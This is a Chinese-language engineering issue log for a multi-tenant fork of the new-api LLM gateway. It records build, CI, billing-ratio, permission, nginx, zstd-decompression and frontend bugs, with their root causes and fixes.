- **要点/坑**：① new-api **无 `internal/` 目录**，我们的不冲突，直接铺入并 rename 模块前缀 `newapi-mt/internal → github.com/QuantumNous/new-api/internal`（77 文件）。② new-api 用 `gorm v1.25.2`/`gin v1.9.1`（低于我们曾用的 v1.31/v1.12），但我们 `internal/` 仅用 gorm 基础 API、不 import gin，故向下兼容（已 `go build ./internal/...` 验证）。③ **本地无法整库编译**：根 `main.go` `//go:embed web/default/dist`，dist 未构建则 build 失败——`go mod tidy`/整库构建一律在服务器 Dockerfile 内（bun 构建前端 dist 后）完成。④ new-api 前端 **bun** 构建（default+classic 双前端），实测很快（整镜像 ~分钟级，319MB）。
- **解决/规避**：在分支 `phase2-newapi-fork` 做（main 留 Slices 1–4）；机械合并交 Worker、服务器 Docker 构建+部署交 Master；fork 基座已在测试栈跑通。
- **升级**：Phase 2 后续 5a/6a 在此 fork 上做；正式栈关系/前端切换见 `doc/tasks/phase2.md`。

### [已解决] 后端逻辑层先行、不先 fork new-api
- **现象**：prompt.md Wave 0 写"先 fork new-api"，但实际先把 14 个新模块按独立 Go 包 + 接口 mock 实现并单测，未先 fork。
- **根因**：详设采用"消费者定义接口 + 增量为主"，新模块逻辑层不依赖 new-api 源码即可 100% 单测；先 fork 反而拖慢、引入编译噪声。
- **解决/规避**：逻辑层 standalone 先行（已全绿），new-api fork 合并下沉到集成阶段（GORM/Redis/handler/装配一起做）。
- **升级**：已写入 progress.md「集成层待办」；基线源 = `github.com/QuantumNous/new-api`（见 CLAUDE.md）。

### [已解决] 真实微信/支付宝接入：本机无 Go 工具链 + 微信回调路径不一致
- **现象**：① 接 `wechatpay-go`/`smartwalle/alipay/v3` 写 `auth-service/realpay/*` 后，本机 `go`/`go.exe` 均不在 PATH，无法本地 `go build`/`go test` 验证。② `internal/payment/model.go` 的 `ProviderWxpay.NotifyPath()` 返回 `/pay/wxpay/notify`，但 auth-service mux 与 nginx 只注册了 `/auth/wxpay/notify` —— mock 模式不暴露（确认页内部合成回调），真实微信回调会 404。
- **根因**：① 本项目唯一环境是服务器（W4），Mac/本机只编辑调试。② mock 链路从不真正经过 `notify_url`，故路径笔误一直未被发现。
- **解决/规避**：① 把验签/解密（依赖 SDK）与「解析+商户校验+金额换算」（纯函数 `wxTransactionToInfo`/`aliNotificationToInfo`）拆开，对纯函数写可离线编译的单测；真实 crypto 留服务器沙箱 E2E。`go.mod` 加 require，服务器 `go mod tidy && go build ./... && go test` 验证。② auth-service mux 增注册 `POST /pay/wxpay/notify`，nginx `tokendream` vhost 增 `^~ /pay/` 反代到 auth-service（与 `^~ /auth/` 同）。③ `smartwalle/alipay/v3` 的 `TradePagePay`/`TradeQuery` 随版本演进，代码内以 `NOTE(W4)` 标注，服务器构建时核对签名。
- **升级**：暂不升级为硬约束；"真实支付接入需服务器构建验证 + 核对 alipay v3 签名" 已写入 `docs/vendor/payments/deploy-real-payments.md`（上线指南）。

### [已解决] CI 只剩反灌水 bot、不跑任何测试 + preflight 前端步用错包管理器（audit #10）
- **现象**：仓库有 176 个 `*_test.go`（1167 个 `func Test`）+ 5 个前端测试，但 7 个 GitHub workflow 里唯一的 PR 门是 `peakoss/anti-slop`（反 AI 灌水 bot，且只在 opened/reopened 触发、连 synchronize 都不含）；docker/release/nightly 等全是上游继承的构建推镜像，`grep 'go test|vitest|go vet' .github/workflows/` **零命中**。质量门只剩本地 deploy 时的 `scripts/preflight.sh`，还留了 `SKIP_PREFLIGHT=1` 逃生口（`deploy/ops/deploy.sh:51`）。且 preflight 前端步 `pnpm install && pnpm build` **用错包管理器**——项目真源是 `web/bun.lock`（无 pnpm-lock），且 `pnpm build` 在 workspace 根跑（根 `package.json` 无 build 脚本），前端预检形同虚设、还从不跑前端测试。
- **根因**：7 个 workflow 全是上游 new-api 继承来的（构建/发布向），从没人加"跑测试"的 PR 门；本地 preflight 是唯一门却能被 `SKIP_PREFLIGHT=1` 绕过，且它的前端步本身就是坏的（pnpm≠bun、build 目录错、无 test）。
- **解决/规避**：① 新增 `.github/workflows/ci.yml`（`push[main]` + `pull_request`）——backend job 跑 `gofmt(internal)→go build→go vet→go test ./... -race`（即 preflight 的 Go 序列），frontend job 跑 `bun install --frozen-lockfile → bun test → bun run build`；`setup-go` 用 `go-version-file: go.mod` 单一真源，`concurrency` 取消旧 run。② 修 `preflight.sh`：前端步 pnpm→bun、补 `bun test`、gofmt 目标 `cmd internal`→`internal`（cmd/ 已随 fork 基线合并移除），使本地 preflight 与云端 CI **完全对齐**。本地实测全绿：`bun install`(1611 包)/`bun test`(79 pass 0 fail)/`bun run build`(产出 dist)；Go 侧确认无需 MySQL/Redis（`glebarez/sqlite` 内存库，外部库测试被 `TEST_MYSQL_DSN`+`t.Skip` 挡住；`clickhouse_log_test.go` 的 `tcp(localhost:3306)` 只是 DSN 解析测试字符串），go.mod 无 `replace`/无 `vendor/`。③ **首次 CI 实跑（push→main，run 28998511372）即验证有效**：frontend 绿；backend 的 gofmt 步揪出 committed `internal/` **13 个历史未格式化文件**（preflight 是 pre-deploy 门、非 pre-commit，加 `SKIP_PREFLIGHT` 逃生口 → 未格式化代码一路进库、build/test 照过不误）。其中 3 个正被并行 WIP 占用、不能此刻干净 `gofmt -w` → 遂把 gofmt（CI+preflight）**暂改仅告警**（`::warning::` 仍列欠账文件），让 build/vet/test 成为实际门；待 WIP 落地后 `gofmt -w internal` 清账再改回 `exit 1` 阻断。
- **升级**：**建议升级为硬约束（待用户确认填入 CLAUDE.md C 表）**——"测试必须在 CI 跑，`SKIP_PREFLIGHT=1` 只是本地便利、非唯一门"。注意：CI 文件需 commit + push 到 GitHub 才生效；本轮已推 origin/main、GitHub runner 首跑（frontend 绿、backend 待 gofmt 软化后复跑 build/vet/test）。**遗留 TODO**：清 `internal/` 13 个未格式化欠账、gofmt 改回阻断。

### [已解决] 前端 5 个测试混用 node:test 与 vitest 两种写法——仅 `bun test` 能统跑
- **现象**：要给前端测试加 CI，但 `web/default` 无 `test` npm 脚本、无 vitest 配置、`vitest` 根本没装（`bun.lock` 0 命中）；5 个测试文件却分两派——3 个 `import from 'node:test'`+`node:assert/strict`，2 个 `import { describe, it, expect } from 'vitest'`。没有任何单一常规命令能同时跑通两者（`vitest run` 缺依赖/配置；`node --test` 不认 vitest 写法）。
- **根因**：测试文件历史上分批加入、用了两种框架写法，但因从没进过 CI（见上条），没人配统一 runner；`vitest` 未安装 → `import from 'vitest'` 只能靠运行器的别名解析才能跑。
- **解决/规避**：**`bun test`** 是唯一能同时跑通的命令——bun 内建实现 `node:test`，又会自动把 `vitest` import 别名到 `bun:test`，且原生按目录发现 `*.test.ts(x)`、原生转译 TS/TSX，无需任何配置。实测 `cd web/default && bun test` → **79 pass / 0 fail across 5 files**（含那个 `.tsx`——它是纯逻辑断言、不 render DOM，故无需 happy-dom/jsdom 环境）。已定为 CI 与 preflight 的前端测试命令。
- **升级**：新增前端测试统一用 `bun test` 跑；写法用 `node:test` 或 `vitest` 皆可（bun 都兼容），但**别引入 `vitest` 依赖/配置**制造"看起来该用 vitest 却没装"的迷惑。

---

## 三、业务逻辑

> 多租户识别、计费扣费、用户组倍率、成本保护、收益分润、渠道中继、认证隔离等业务 Bug。

### [已解决] relay 编排顺序：详设与任务书不一致（模型权限 vs 风控先后）
- **现象**：detailed-design §2.11 文字写"鉴权→租户→**模型权限→风控**→…"，而 `tasks/11-relay.md` 写"…→**风控→模型**→…"，Worker 实现按任务书（风控先）。
- **根因**：两份文档措辞不一致。
- **解决/规避**：统一为 **风控先于模型权限**（先做便宜的状态/限流拦截，再查模型权限），已据此修订 detailed-design §2.11/§3.1；risk 模块内部顺序为 状态→IP→RPM（限流置末，避免对已拒请求计数）。
- **升级**：已统一文档；编排顺序写入 api-contract.md 调用链说明。

### [待确认] tokenplan 种子缺 agent_cost_price / min_price
- **现象**：proposal §8.2 套餐表只给 售价/原价/月限额/成本估算，缺**代理成本价**与**零售保护线**两列，而 tokenplan 计费/保护线需要。
- **根因**：需求表未含该两列。
- **解决/规避**：Worker 按默认派生 `agent_cost = base×0.8`、`min_price = agent_cost×1.1`（seed.go 常量，主站后台可覆盖），先跑通。
- **升级**：`[待确认]` —— 需用户给真实代理成本价/保护线口径；对应 progress.md 待确认 #5/#6 同批确认。

### [已解决] RETAIL_BELOW_MIN 错误码映射与"不吞码"原则的张力
- **现象**：tokenplan.SetListing 把 pricing 守卫返回的 `PRICE_BELOW_PROTECTION` **映射**为本域 `RETAIL_BELOW_MIN`，与 §6.4"跨模块错误原样上浮、不吞码"略有张力。
- **根因**：同一保护线被不同域消费，前端希望拿到域内稳定码（tokenplan 页显示"低于套餐保护价"）。
- **解决/规避**：刻意取舍——域边界做一次语义映射（保留原错误为 cause，可 errors.Is 解包），并在 api-contract.md 错误码表标注映射关系。
- **升级**：约定"跨域映射须保留 cause 且在契约表登记"，已记入 api-contract.md。

### [已解决-临时] Slice 1 用 cmd 层临时 `site_configs` 表服务品牌字段
- **现象**：`GET /api/tenant/current` 要返回 `site_name/logo_url/theme_color/footer_text`，但 `tenant.Tenant` 实体只有 slug/status，这些品牌字段归属 **SiteConfig** 模块。
- **根因**：Slice 1 只接了 tenant 模块的 GORM repo，SiteConfig 模块的 GORM repo 尚未接入。
- **解决/规避**：cmd/server 装配层临时建了个小 `site_configs` 表 + demo seed，先跑通管道。
- **升级**：`[待 Slice 2/3]` 接 SiteConfig 模块真实 GORM repo，`/api/tenant/current` 改为 join `tenant + tenant_site_configs`；临时表届时移除。

### [已解决] 前端菜单可见性必须镜像后端鉴权范围（代理自助露给了所有登录用户）
- **现象**：「代理自助」菜单（套餐上架/推广/兑换码/我的用户/用户组 + 我的收益）对**所有登录用户**可见（前端只 gate 了"登录"）。普通用户、代理在主站/别人站点进去就撞后端 `AGENT_FORBIDDEN`「无权访问该代理资源」401。
- **根因**：自助端点后端是 `AgentOwnerAuth`（Host 租户 owner==当前用户）守的，但**前端菜单/路由没有对应这个范围**——可见性与鉴权脱节。
- **解决**：加只读信号 `GET /api/tenant/agent-context`(UserAuth)→`{is_agent_owner}`（直读 Host 租户 owner）；侧栏加 `agentOwnerOnly` 维度按它过滤（loading 期 fail-closed 隐藏）；自助路由加 `beforeLoad`→非 owner `redirect /403`。实测：普通用户 0 项菜单 + 直接 URL 跳 403；代理在自己站 6 项。
- **升级**：**凡是后端按特殊范围(owner/角色/租户)守的功能，前端菜单与路由守卫必须用对应的后端信号同范围门控**，不能只判"登录"；可见性脱离鉴权 = 用户撞 403 的糟糕体验。

### [已解决] new-api 默认把 vip 暴露成"所有人可自选分组"（分组越权 + 计费风险）
- **现象**：任意普通用户建 API Key 时可自选 `vip` 分组并真的用上（享 0.8x 低价），无需管理员分配。`svip`/`kiro` 却正确受限（"无权访问 X 分组"）。
- **根因**：`setting/user_usable_group.go` 硬编码默认 `userUsableGroups = {default, vip}` —— vip 被当成公共可自选分组。中继校验 `GetUserUsableGroups(userGroup)`（=全局 UserUsableGroups + 用户自身 group），vip 在全局表里 → 谁都能用。
- **解决**：把 `UserUsableGroups` 选项固化为仅 `{"default":"默认分组"}`（运行期 `PUT /api/option` 已改，并固化进 `internal/mtwire/seed.go` 首次初始化）。效果：用户只能用**管理员分配给他的分组**（`GetUserUsableGroups` 总会补上用户自身 `User.Group`）；vip/svip/kiro 等高级分组一律"管理员后台配渠道 + 设 User.Group 分配"。实测：chanuser1(default) 自选分组只剩 default、旧 vip token 调用被拒；admin 设 kirouser=kiro → 路由到 kiro 渠道(claude)。
- **子坑**：直接 `UPDATE users SET group=...` 改分组**不刷用户缓存**（`GetUserGroup` 读 `GetUserCache`），relay 仍读旧分组；**必须走 admin API `PUT /api/user/`** 才会刷新。改用户属性一律走 API，不直改 DB。
- **升级**：**新增/启用任何"高级分组"后，确认它不在 `UserUsableGroups` 自选表里**（默认仅 default）；高级分组只能管理员分配。属计费越权红线。

### [Phase 1 已完成] 2D 倍率（层级 × 模型分组）—— 计费交互 + 调试坑
- **做了什么**：计费倍率升级二维相乘（见 `doc/detailed-design.md` §2.15）。`grouphook.ModelGroup2DResolver`（mtwire 注入）在 `HandleGroupRatio` 算 `GetGroupRatio(UserGroup层级) × (IsModelGroup(UsingGroup) ? GetGroupRatio(UsingGroup) : 1)`；`model_groups` 登记表标记模型分组；admin API `/api/admin/model-groups` CRUD 同步 GroupRatio+UserUsableGroups；后台「模型分组管理」页。实测：vip×claude-kiro=0.24、default×claude-kiro=0.3、admin default=1，全对。
- **关键交互（Phase 2 必处理）**：`HandleGroupRatio` 优先级 = ①租户覆盖 `TenantGroupRatioResolver`（命中即返）→ ②2D → ③原生兜底。所以**代理租户对某组的 markup 覆盖会抢在 2D 前生效**：chanuser1 在 tokendream（tenant_groups 有 default=1.5）→ default token 走 markup=1.5、claude-kiro token 走 2D=0.3（无该组覆盖）。Phase 1 此交互"覆盖优先、按组各管各"已知且可接受；**Phase 2 代理参与时要把 markup 与 2D 组合（按组合下限保护）并重定优先级**。
- **调试坑**：① `tenant_groups` 列名是 **`group_name` 不是 `group`**（`SELECT \`group\`` 静默返空，配合 `CONCAT` 遇 NULL 返空更难发现）——查多租户分组覆盖用 `group_name` 或 `SELECT *\G`。② mtwire `New()` 预热模型分组缓存早于 `Migrate()` 建表，启动有一条 `Table doesn't exist` 报错但无害（迁移后重载）；Phase 2 可调 New/Migrate 顺序消除。

### [已解决] 2D 上线后两个 UX/数据坑：建Key下拉露层级 + 代理 owner 落错租户
- **坑1 · 建Key分组下拉露 default/vip**：`GetUserGroups`(self/groups) 默认显示**全部可用分组**（含层级 default + 用户自身 group 如 vip）+ **原生倍率**（不含租户覆盖）。2D 下用户建 Key **只该选模型分组**、且应看**实际扣费倍率**。修：新增 `grouphook.ModelGroupDropdownResolver`（mtwire 注入），`GetUserGroups` 据此**只保留模型分组**（IsModelGroup）、倍率改 **2D 有效值**（层级×模型分组覆盖）。钩子未装配则维持原生。
- **坑2 · 代理 owner 的 tenant_id 错落注册租户（甚至别人的店）**：owner 在某租户域名下注册→`users.tenant_id` 是那家；建代理只设 `tenants.owner_user_id`，**没改 owner 自身 tenant_id**。结果 owner 自用错按那家租户的覆盖计费（agentdemo owner 落在 tokendream，自用走了 tokendream 的 0.5）。用户确认 **Option B（owner 自用按主站基准/进货价）**。修：`HandleAdminCreateAgent` 设 **owner.tenant_id=0**（+ 一次性 `UPDATE users JOIN tenants` 修存量）。效果：owner 自用走平台基准×自身层级、不受任何代理覆盖；只有其名下用户(tenant_id=该店)享代理加价。
- **测试启示**：验代理覆盖**要用真正属于该租户的用户**（在代理域名下注册→tenant_id=该店），别用 owner 账号（owner=平台基准）。
- **升级**：**代理 owner 自身一律 tenant_id=0（平台基准）；代理覆盖只对其名下用户生效。** 建Key下拉只列模型分组、显 2D 有效扣费倍率。
- **坑3 · 渠道编辑「分组」字段沿用原生"用户组"语义**：原生文案"可以访问此渠道的用户组" + 下拉列**全部分组**（含层级），但 2D 下渠道分组=**模型分组**（路由用），不是用户组/层级。修（仅前端 channel-mutate-drawer）：文案改"此渠道服务的模型分组"、标签→「模型分组」；下拉数据源从 `getGroups`(全部) 换 `getModelGroups`(`GET /api/admin/model-groups`)只列已登记模型分组。**升级：凡 new-api 原生 UI 里"分组/用户组"的文案与下拉，2D 下都要审一遍——区分"层级(计费)"和"模型分组(路由)"。**（遗留：tag 批量编辑/表格筛选仍用全量分组、其它语言文案未改，属后续。）

### [已解决] 弹窗打不开的真根因是「插槽式布局丢弃非slot子节点」（不是 Dialog 组件！耗了 3 次尝试）
- **现象**：代理「设置层级」+ 提现/充值/推广渠道新建等**所有弹窗点了不打开**（无 `[role=dialog]`、无 console 报错）。误以为是 base-ui `Dialog` 组件 bug，改动画(`data-open:animate-in`→`data-starting-style`)无效、部署后仍不开。
- **真根因**：`components/layout/components/section-page-layout.tsx` 是**插槽式复合组件**——`Children.forEach` 只渲染 `.Title/.Actions/.Content/.Breadcrumb` 这些插槽，**其它直接子节点被静默丢弃**。坏页把弹窗当 `<SectionPageLayout>` 的**裸直接子节点**渲染（与 `.Content` 平级）→ 整个弹窗子树被过滤、**从不挂载** → 受控 `open` 无组件可驱动。正确写法见 wallet(弹窗放 `</SectionPageLayout>` 外 Fragment)/tenant-plans(放 `.Content` 内)。"Sheet 能开/Dialog 不能"是巧合(能开的恰好渲染在插槽内；兑换码的 Sheet 同样被丢弃)。
- **解决**：让 `SectionPageLayout` 把非 slot 子节点也渲染出来（收集到 `extras` 数组、`<Main>` 末尾 Fragment 渲染）。一处修复修好 4 页全部弹窗。**本地 dev+prod playwright 实测弹窗能开**后才部署。
- **教训**：①弹窗"点了没反应、无报错" → **先查它是否被父布局/插槽组件丢弃**（DOM 里有没有挂载），别一头扎进弹窗组件本身。②难查的运行期 bug 用**本地 dev server + playwright 最小复现**对照（裸组件 vs 真实页），比纯静态分析/反复部署快得多。③我误判过一次(动画)、提交了无效 fix(0c0f0d3)——运行期问题必须运行期验证。

### [已解决] LLM/Codex 大请求体 413（nginx client_max_body_size）
- **现象**：用户在 Codex 配代理站 base_url+key 调 `/v1/responses` → `413 Request Entity Too Large`（nginx 返），账户有钱、非计费问题。
- **根因**：nginx.conf http 级 `client_max_body_size 50m`，通配 vhost 继承；Codex 带大代码上下文/文件，请求体 >50MB（实测 60MB→413、2MB→通过）。CF 免费版上限 100MB，故落在 50–100MB。
- **解决**：通配 + api-443 vhost **server 块内**加 `client_max_body_size 200m`（实测 60MB→401 通过）。**坑：`sed '/server_name/a'` 误匹配注释里的 "server_name" 导致重复指令 + 插到 server 块外 → nginx -t 失败**；改用精确匹配 `^[[:space:]]*server_name .*;$`（行首缩进+分号，排除注释）。仓库 `deploy/nginx/` 副本同步。
- **升级**：LLM 网关 vhost 必设较大 `client_max_body_size`(≥CF 上限)；改 nginx 用 sed 插入务必精确匹配、避开注释，且 `nginx -t` 过了才 reload。

### [已解决] 新模型没配价 → `model_price_error`（与端点/Codex 无关）
- **现象**：Codex(`/v1/responses`) 调 gpt-5.5 失败，user 以为是端点/Codex 问题、以为 Cherry(`/v1/chat/completions`) 能通是端点差异。
- **真根因**：gpt-5.5 没配 ModelRatio → new-api 转发前拦 `400 model_price_error`。**两个端点报的是同一个错**（复现确认）——与 Codex 无关。现网栈压根没 gpt-5.5 渠道，所以 Cherry"能通"是连了别的已配价模型/直连上游。
- **解决**：经 `PUT /api/option/`（会刷内存缓存，**别直接改 DB**）合并写入 ModelRatio/CompletionRatio。
- **计费换算（关键）**：new-api 约定 `ModelRatio=1 ↔ $2/1M`（QuotaPerUnit 默认 500000：1M tokens × ratio × groupRatio / 500000 = $）；2D 下 **groupRatio 会再乘模型价**。要让客户实付价=P（如 openai-plus 组 ×0.5、目标 gpt-5.5 输入$2/输出$12）：`ModelRatio = P_输入÷2÷groupRatio = 2÷2÷0.5 = 2`、`CompletionRatio = P_输出÷P_输入 = 12÷2 = 6`。实测扣费 $0.008954 = 图价，验证准确。
- **升级**：①加新模型/渠道后必到「系统设置→分组与模型定价」配 ModelRatio(+CompletionRatio)，否则 `model_price_error`。②定"客户实付价"时记得**先除以该模型分组的 groupRatio**再换算 ModelRatio。③调试上游调用先复现**两个端点**对比——同错=非端点问题。④**按次价 ModelPrice 也乘 groupRatio**（price.go:136 `modelPrice×QuotaPerUnit×GroupRatio`，图像模型再乘 ImagePriceRatio）：要客户实付 $0.062/次、组×0.5 → ModelPrice=0.124。⑤**改渠道 models 别用 GET+PUT**：`GET /api/channel/:id` 不返回 key（返回空），PUT 回去会抹掉上游 key。安全做法：直接改库 `channels.models` + 删 `abilities` 对应行，再 `docker restart` app 重载路由（abilities 表才是路由真源）；改完务必复验「保留的模型仍 200 + 删掉的模型 model_not_found」。

### [已解决] codex 用 zstd 压缩请求体 → new-api 不解 → `invalid JSON request body`（挖了很久）
- **现象**：codex 调任何模型都 `400 Invalid request: invalid JSON request body`（`middleware/distributor.go:217` 的 `gjson.ValidBytes` 失败），但我直接 curl 简单 body 200、Cherry 也"能用"。
- **逐步排除**：不是大小（直连 50KB→200、200KB 是上游慢超时非解析错）、不是 gzip（gzip body 直连→200，说明 new-api 本就解 gzip）、不是 nginx（仿造 codex 式 body 经 nginx→200）。
- **真根因（靠本地抓包确认）**：起本地 HTTP 日志服务器、把 codex `base_url` 临时指过去，抓到 codex 请求头 **`Content-Encoding: zstd`**——codex 用 **zstd** 压缩请求体。`middleware/gzip.go` 的 `DecompressRequestMiddleware` 只解 `gzip`/`br`、**没有 zstd 分支** → 分发层读到原始 zstd 字节 → `gjson.ValidBytes` 失败。CF/nginx 不解请求体 zstd。
- **解决**：`middleware/gzip.go` 加 `case "zstd"`（`klauspost/compress/zstd`，已是依赖，转直接）。部署后 codex 全部模型经 `/v1/responses` 实测 PONG ✅。
- **教训**：①`invalid JSON request body` 类错误**先查 `Content-Encoding`**（gzip/br/**zstd**/deflate）——服务端是否解得了客户端的压缩方式。②抓不到包时（docker 端口转发路径），**起本地日志服务器 + 把客户端 base_url 指过去**是抓真实请求(头+体)最干净的办法。③现代客户端(codex)默认 zstd 压请求体，LLM 网关务必支持解压 zstd。

### [已解决] 改模型分组名要全栈一起改（分组名=路由键），否则模型广场空
- **现象**：在「系统设置→分组定价」把分组改名（claude-kiro→claude），模型广场里分组显示出来了但**0 个模型**。
- **根因**：分组名是**路由键**，散落 6 处——`GroupRatio`(倍率)、`UserUsableGroups`(可选分组)、**`channels.group`(路由真源)**、`abilities`、`model_groups`、`tokens.group`。「分组定价」页**只改 GroupRatio+UserUsableGroups**，没动渠道侧 → 新名无渠道(无模型)、旧名变孤儿(不可选)。还顺带把 default/vip/svip 三个层级从 GroupRatio 删了 → 2D 层级计费废。
- **解决**：改名要上述 **6 处一起改**（一条 SQL 事务）；层级倍率(default/vip/svip)必须留在 GroupRatio。
- **供应商（模型广场按 OpenAI/Anthropic 分组）**：`vendors` 表存供应商(name 唯一+lobehub 图标名)，**`models` 表的 `vendor_id`** 关联模型；模型必须**登记进 models 表并设 vendor_id** 才会在广场归到供应商下（models 表空则广场无供应商分组）。
- **升级**：①「分组定价」里只改倍率**值**是安全的；改分组**名**必须走全栈 SQL（6 处）。②删渠道前想清楚——**同上游 key 的另一渠道可直接补上同样的模型**（改 `channels.models`+`abilities`+重启），不必重加渠道/重填 key（codex刀 id1 被删后，用同 key 的 codex刀pro id2 补全了 gpt 模型）。③改库后必 `docker restart` app 重载 abilities/options/models 缓存。

### [已解决] 6e 违禁词接入 new-api：原生已有 AC 敏感词 + live 链是 `controller/relay.go` + `dto.Request` 不暴露消息
- **现象**：要在 /v1 转发前扫「用户输入」违禁词，但不知挂哪、怎么拿到用户消息。
- **根因/发现**：①new-api **原生已自带**敏感词（`service/str.go` Aho-Corasick 引擎 + `service/sensitive.go` + `setting/sensitive.go`，go.mod 已有 `anknown/ahocorasick`），但**全局/仅拦截/不记录**，满足不了多租户+remind+审阅。②**live /v1 链是 `controller/relay.go`**——`internal/relay.Gateway` 是设计好但**休眠**（`NewGateway` 无人调、gateway.go 自注 TODO），别挂错；原生敏感词检查在 `controller/relay.go:~136`（扫 `meta.CombineText`）。③`dto.Request` 接口只暴露 `GetTokenCountMeta/IsStream/SetModelName`，**不暴露消息**；`TokenCountMeta` 只有 `CombineText`（含 system/assistant）。要「仅用户输入」必须**按格式类型断言**：`*dto.GeneralOpenAIRequest.Messages`(role==user→`ParseContent()`)、`*dto.OpenAIResponsesRequest.Input`(json.RawMessage，自解析 string/数组)。
- **解决**：复用原生 AC **范式**（模块内自带 `goahocorasick`，不 import 原生 service，§1.4）；在 `internal/moderation` 建多租户/remind/记录；hook 走 **`internal/platform/agenthook`** 包级 var（`ScanUserInput`，原生 relay 调、mtwire `InstallHooks` 注入、nil 回退——避免 native→mtwire import 环）；`controller/relay.go` 原生敏感词检查后加一段调用（小原生改动）。
- **升级**：①接 /v1 旁路逻辑一律走 `agenthook` 包级 var，别在原生包 import mtwire。②改原生 relay 前先确认 live 链是 `controller/relay.go`（不是休眠的 `internal/relay.Gateway`）。

### [已解决] 主站买家端点(套餐购买/充值)在主站 Host 上报 TENANT_NOT_FOUND —— 主站也直销，不该报错
- **现象**：管理员/用户在主站（`www.wedreamhub.com`，非租户）点「个人套餐购买」报「租户不存在」；充值同因。`HandleListTokenPlans/HandlePurchase/HandleListSubscriptions/HandleWalletRecharge` 都写死 `tenantFrom(c)==nil → TENANT_NOT_FOUND`，而主站在 `tenant_domains` 里没有对应行。
- **根因**：这几个买家端点只认 Host 中间件解析出的租户，没有"主站自己也是卖家"这个分支——但产品侧已确认主站自身直销 tokenplan 套餐 + 接受直充。
- **解决**：新增 `App.resolveBuyerTenant(c)`（`http.go`）：已解析租户→原样返回；未解析但命中 `tenant.IsMainSiteHost`（`internal/tenant/resolver.go`，7e8360b 引入的三态判别）→ 回退到 `seedPlatformTenant`（`seed.go`）幂等建的 "platform" 租户（owner=首个管理员，不建 `agent_profiles`，不出现在代理列表）；都不是→维持 `TENANT_NOT_FOUND`。`HandleTenantRechargeMethods` 未在报告里点名，但前端把它当成充值卡渲染开关（失败即隐藏整卡），同一根因，一并修。
- **子坑 1（差点漏改的另一半）**：`seedPlatformTenant` 给平台租户挂了个 owner（root），而 `callerOwnedTenant`(→`HandleAgentContext`) 与 `AgentOwnerAuthByUser`(agent-self 路由组真实鉴权闸门) 都靠 `TenantByOwner` 反查"这个用户拥有哪个租户"——两处都会把 root 误判成"拥有一个代理租户"，前端会给管理员展示整套代理自助菜单，后端也会真的放行管理员对平台租户发起提现等 agent-self 操作。**只排除 UI 信号(callerOwnedTenant)、不排除真实鉴权闸门(AgentOwnerAuthByUser)= 门面式修复**——两处必须用同一个 `isPlatformTenant(t)` 判定同时收口。
- **子坑 2（单测踩过一次的 nil-panic）**：`httptest.NewRequest` 不显式设 `req.Host` 时默认给 `"example.com"`；而 `tenant.IsMainSiteHost` 对"不在 `*.wedreamhub.com` 下的外部域名"有意兜底 `true`（本地直连/开发场景）。二者一叠加，一个零值 `&App{}`（`TenantRepo==nil`）的既有测试走到新加的主站回退分支时对 `nil` 的 `*gormrepo.Repo` 调用方法，直接 panic。修法：`resolveBuyerTenant` 对 `a.TenantRepo==nil` 短路直接判 `TENANT_NOT_FOUND`（沿用 `grouphook.go` 里已有的同款防御惯例），不是改测试凑合过。
- **升级**：①任何新增/复用"Host 未解析出租户"分支的 handler，都要过一遍 `tenant.IsMainSiteHost` 三态，不能自己再造一版主站判定。②新代码只要调用 `TenantByOwner` 反查"用户拥有的租户"，必须过 `isPlatformTenant` 排除——已有 `callerOwnedTenant`/`AgentOwnerAuthByUser` 两个封装可直接复用，不要绕开它们直连 `TenantRepo.TenantByOwner`。③给这类"主站兜底"逻辑写单测，零值 `&App{}` 一定要么补齐依赖、要么显式设 `req.Host` 避开 `example.com` 默认值。

### [已解决] `webgl3d` 类晚于首次量尺 → `display:none` 下 `clientWidth=0` → 渲染缓冲 0×0（灯泡对真实用户全空）
- **现象**：`bulb-orbit/index.html` 的 `initBulb3D()` 原始顺序先调 `onResize3D()` 再 `document.body.classList.add('webgl3d')`；此时 `#bulb3d` 仍 `display:none`，`canvas.clientWidth===0`，`renderer.setSize(0,0,false)`/`composer.setSize(0,0)` 把 WebGL 绘图缓冲区永久锁定 0×0——PNG 回退灯泡又已被 `body.webgl3d` 规则隐藏，真实用户打开页面（不手动缩放窗口）看到的中央区域完全空白，比替换前（总能看到 PNG 灯泡）更差。
- **根因**：`display:none` 元素的 `clientWidth`/`clientHeight` 恒为 0，量尺必须发生在切换为可见之后；无头 Chrome 截图工具的 `--window-size` 在渲染开始后才应用到真实窗口，会顺带触发一次"意外" `resize` 事件，掩盖了这个问题，使当时的 CLI 截图看起来正常（掩盖了 bug 的副作用，不是 bug 不存在）。
- **解决**：把 `document.body.classList.add('webgl3d')` 挪到 `onResize3D()` 之前，四个数值参数不变，仅调整语句顺序（commit `7627945`）。
- **升级**：`display:none` 元素的尺寸量测恒为 0，必须先切换显示再量尺；验证此类时序 bug 须用固定视口、全程零 resize 的会话（如 playwright 显式设视口后不触发原生 resize 事件）——无头截图工具的隐式 resize 会掩盖真实用户场景下才会暴露的 bug。

### [已解决] 键盘点亮（Enter/空格）未同步触发 3D 核心喷发——新交互只挂了 pointerdown 捕获
- **现象**：鼠标/触屏点击点亮灯泡时会触发 3D 核心喷发（灯丝脉冲+辉光+点光闪烁），但键盘 Enter/空格点亮时喷发不播，与「键盘可触发，与鼠标/触屏等效」的既定规格（`bulb-orbit/交互修改文档.md` §八、设计稿 §6）不符。
- **根因**：新增的核心喷发触发只接了 `pointerdown` 捕获段监听，主脚本原有的键盘点亮路径（`keydown` → `ignite()`）不产生 `pointerdown` 事件，两条触发路径互不相通。
- **解决**：对称地追加一个 `keydown` 捕获段监听（`(e.key==='Enter'||e.key===' ') && body.classList.contains('pre')` 时调用同一个 `surge()`），与 pointerdown 分支并列、互不干扰（commit `ad315f6`）。
- **升级**：给既有交互补充新效果时，必须先枚举该交互的**全部**触发入口（鼠标/键盘/触屏），逐一确认新效果都挂上了，不能只对齐看得见的主入口。

### [已解决] 实体网格在「加法粒子 + 亮度转 alpha」构图里两类穿帮：暗色网格冲出黑框洞、白色小网格成生硬光条
- **现象**：粒子灯泡上线后用户放大截图反馈两处瑕疵——①灯泡中心一根生硬的白色竖条；②「点 击 点 亮」上方的点云底座里有多个硬边黑色方框（bulb-orbit，2026-07-07 下午）。
